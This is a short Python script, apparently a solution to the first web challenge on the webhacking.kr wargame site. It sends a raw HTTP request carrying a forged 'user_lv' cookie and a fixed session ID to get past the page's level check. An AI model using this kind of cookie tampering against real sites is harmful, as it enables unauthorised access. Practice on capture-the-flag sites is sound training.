import socket

send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
data = "GET /challenge/web/web-01/index.phps HTTP/1.1\r\n" + \
       "Host: webhacking.kr\r\n" + \
       "Cookie: user_lv=5.1; PHPSESSID=36126de4afe565318474fc2d7760d558\r\n" + \
       "\r\n"

send.connect(("183.111.174.96", 80))
send.send(data.encode())
recv = send.recv(1500)
send.close()

print(recv.decode())
